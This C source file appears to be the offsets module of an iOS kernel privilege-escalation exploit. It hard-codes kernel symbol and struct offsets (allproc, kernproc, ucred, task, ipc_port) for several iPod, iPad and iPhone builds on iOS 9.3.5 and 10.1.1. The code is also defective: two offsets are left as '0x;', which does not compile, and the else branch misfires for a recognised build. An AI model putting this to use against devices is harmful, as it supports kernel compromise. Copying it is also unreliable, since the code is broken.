#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/utsname.h>

#include "offsets.h"

// offsets from the main kernel 0xfeedfacf
uint64_t allproc_offset;
uint64_t kernproc_offset;

// offsets in struct proc
uint64_t struct_proc_p_pid_offset;
uint64_t struct_proc_task_offset;
uint64_t struct_proc_p_uthlist_offset;
uint64_t struct_proc_p_ucred_offset;
uint64_t struct_proc_p_comm_offset;

// offsets in struct kauth_cred
uint64_t struct_kauth_cred_cr_ref_offset;

// offsets in struct uthread
uint64_t struct_uthread_uu_ucred_offset;
uint64_t struct_uthread_uu_list_offset;

// offsets in struct task
uint64_t struct_task_ref_count_offset;
uint64_t struct_task_itk_space_offset;

// offsets in struct ipc_space
uint64_t struct_ipc_space_is_table_offset;

// offsets in struct ipc_port
uint64_t struct_ipc_port_ip_kobject_offset;


void init_ipod_touch_6g_10_1_1_14b100() {
  printf("setting offsets for iPod touch 6G 10.1.1\n");
  allproc_offset = 0x5B4168;
  kernproc_offset = 0x5BA0E0;

  struct_proc_p_pid_offset = 0x10;
  struct_proc_task_offset = 0x18;
  struct_proc_p_uthlist_offset = 0x98;
  struct_proc_p_ucred_offset = 0x100;
  struct_proc_p_comm_offset = 0x26c;
  
  struct_kauth_cred_cr_ref_offset = 0x10;
  
  struct_uthread_uu_ucred_offset = 0x168;
  struct_uthread_uu_list_offset = 0x170;
  
  struct_task_ref_count_offset = 0x10;
  struct_task_itk_space_offset = 0x300;
  
  struct_ipc_space_is_table_offset = 0x20;
  
  struct_ipc_port_ip_kobject_offset = 0x68;
}

void unknown_build() {
  printf("This is an unknown kernel build - the offsets are likely to be incorrect and it's very unlikely this exploit will work\n");
  printf("You need to find these two kernel symbols:\n");
  printf("  allproc\n");
  printf("  kernproc\n\n");
  printf("and update the code\n");
}

void init_offsets() {
  struct utsname u = {0};
  int err = uname(&u);
  if (err == -1) {
    unknown_build();
    return;
  }

  printf("sysname: %s\n", u.sysname);
  printf("nodename: %s\n", u.nodename);
  printf("release: %s\n", u.release);
  printf("version: %s\n", u.version);
  printf("machine: %s\n", u.machine);

    if (strcmp(u.version, "Darwin Kernel Version 15.6.0: Fri Aug 19 10:37:54 PDT 2016; root:xnu-3248.61.1~1/RELEASE_ARM_S5L8940X") == 0) {
        printf("setting offsets for iPad 2 iOS 9.3.5\n");
        allproc_offset = 0x45717c;
        kernproc_offset = 0x411134;
        struct_proc_p_pid_offset = 0x10;
        struct_proc_task_offset = 0x18;
        struct_proc_p_uthlist_offset = 0x98;
        struct_proc_p_ucred_offset = 0x100;
        struct_proc_p_comm_offset = 0x26c;
        struct_kauth_cred_cr_ref_offset = 0x10;
        struct_uthread_uu_ucred_offset = 0x168;
        struct_uthread_uu_list_offset = 0x170;
        struct_task_ref_count_offset = 0x10;
        struct_task_itk_space_offset = 0x300;
        struct_ipc_space_is_table_offset = 0x20;
        struct_ipc_port_ip_kobject_offset = 0x68;
    }
    
    if (strcmp(u.version, "Darwin Kernel Version 15.6.0: Fri Aug 19 10:37:55 PDT 2016; root:xnu-3248.61.1~1/RELEASE_ARM_S5L8950X") == 0) {
        allproc_offset = 0x45f2c8;
        kernproc_offset = 0x;
        struct_proc_p_pid_offset = 0x10;
        struct_proc_task_offset = 0x18;
        struct_proc_p_uthlist_offset = 0x98;
        struct_proc_p_ucred_offset = 0x100;
        struct_proc_p_comm_offset = 0x26c;
        struct_kauth_cred_cr_ref_offset = 0x10;
        struct_uthread_uu_ucred_offset = 0x168;
        struct_uthread_uu_list_offset = 0x170;
        struct_task_ref_count_offset = 0x10;
        struct_task_itk_space_offset = 0x300;
        struct_ipc_space_is_table_offset = 0x20;
        struct_ipc_port_ip_kobject_offset = 0x68;
    } // iPhone5,1-5,4 Offsets
    
    if (strcmp(u.version, "Darwin Kernel Version 15.6.0: Fri Aug 19 10:37:55 PDT 2016; root:xnu-3248.61.1~1/RELEASE_ARM_S5L8945X") == 0) {
        allproc_offset = 0x45717c;
        kernproc_offset = 0x;
        struct_proc_p_pid_offset = 0x10;
        struct_proc_task_offset = 0x18;
        struct_proc_p_uthlist_offset = 0x98;
        struct_proc_p_ucred_offset = 0x100;
        struct_proc_p_comm_offset = 0x26c;
        struct_kauth_cred_cr_ref_offset = 0x10;
        struct_uthread_uu_ucred_offset = 0x168;
        struct_uthread_uu_list_offset = 0x170;
        struct_task_ref_count_offset = 0x10;
        struct_task_itk_space_offset = 0x300;
        struct_ipc_space_is_table_offset = 0x20;
        struct_ipc_port_ip_kobject_offset = 0x68;
    } // iPad3,1-3,3 Offsets
  
    else {
        printf("don't recognize this platform\n");
        unknown_build();
    }
}
